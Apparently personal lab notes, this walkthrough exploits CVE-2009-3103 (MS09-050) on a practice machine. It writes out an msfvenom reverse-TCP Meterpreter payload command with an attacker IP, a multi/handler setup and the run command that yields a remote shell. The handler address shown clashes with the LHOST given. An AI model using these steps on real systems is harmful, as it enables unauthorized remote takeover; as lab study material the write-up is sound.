Method

Method

The main lesson here was that I had to look at the result of the nmap vulns and see what was vulnerable. From there I looked at the CVE details and saw that there was a possibility for rce and googled that. There is a bulletin ms09-050 which uses metasploit. Still need to solve this one without metasploit

1. From the nmap scans, we see it is vulnerable to cve 2009-3103 ![e9919b3042f9351473acd90c2fce9b0e.png](../../../../../_resources/41fd9fa0a31548a088ead34bd5ecda80.png)
2. Google search 'cve-2009-3103 exploit rce' ![922148f145bd69370777c1473d3fa3f1.png](../../../../../_resources/a90b2c56429e4a10b168ca14fc3a3a72.png)
3. Click on EDB-ID 40280 https://www.exploit-db.com/exploits/40280 ![ba622aa1d7183a560558ee69ddfa7eba.png](../../../../../_resources/5bb5ccd163064a18aa9df283c5c567fb.png)
4. Create a python virtualenv `mkproject --python=/usr/bin/python2.7 cve` ![f16221dc386c0a6315bb11da1b15509a.png](../../../../../_resources/4a752c9f526a4e9cab6d9b22ec224fa9.png)
5. Download EDB-ID 40280 via searchsploit ![b836e4ba1a354e4806a12b7210425f9e.png](../../../../../_resources/f2199989d1a846269cc115aa54b3414c.png)
6. When running the exploit, we see that it needs smb to be imported ![06d59b65f602f8228a5781383989729c.png](../../../../../_resources/ba84cc13cfc64a7badd32c49976f3aee.png)
7. Google "smb.smbconnection install" ![da3f34977a6f14a14be7227ed74a5a09.png](../../../../../_resources/edae2decba0d4ff5b50430b1969d56e9.png)
8. This site shows how to install via pip https://pypi.org/project/pysmb/ ![5eaf75de57751202d889bdc583b86ebd.png](../../../../../_resources/00c19a7ba7b24007bd7f65de881347fc.png)
9. Ensure that you're in the virtual environment, then upgrade pip `pip install --upgrade pip` ![bc5d69d2fee48c6d0f4fe0dba40af6dd.png](../../../../../_resources/f9294d1859ec4d198382f8efd784ef52.png)
10. Install pysmb `pip install pysmb`![0a4b20e90a6bbd28af3698fc749ef0bb.png](../../../../../_resources/eca9df88fe9d4185a7b1afdaaff280e7.png)
11. Notice the original python exploit shows an msfvenom command ![a01fc9133ce5d510f6c362af84a20768.png](../../../../../_resources/2c156831625c4261a8a8b483e8fbab5f.png)
12. Copy the exploit, run the msfvenom command using LHOST=KALI_IP and LPORT=443, and use the msfvenom output to replace the shell variable. Here is the command we ran `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.222 LPORT=443  EXITFUNC=thread -f python` ![66d9e3920fa44cb8241110649cba0e07.png](../../../../../_resources/5ada112b708c4eb2a6199a9f7c2e699b.png)
13. Open msfconsole, use the multi/handler, set lhost and lport, then run. You should see it say "Started reverse TCP handler on 192.168.222.43" ![83a77bc68c6b6815b10039136edf6a3b.png](../../../../../_resources/78a129c5094445d481c59e8ad7f2e213.png) 
14. Then run the python exploit `python exploit.py 192.168.222.43` ![7d8e77cd5b793b1791badebd52a3db98.png](../../../../../_resources/ad8afeee4ea14ca9b4d9cb220711fa4b.png)
15. You should now see the shell connect and we have rce ![b9a10abea9954ccce3c785e3c2484bb0.png](../../../../../_resources/fbedd4fa154c4221aa94dc37368bca96.png) ![dbc5586b21fff1106864ba2132ade970.png](../../../../../_resources/4f9f88a56ad746a3a4cd88fbc386f3b0.png)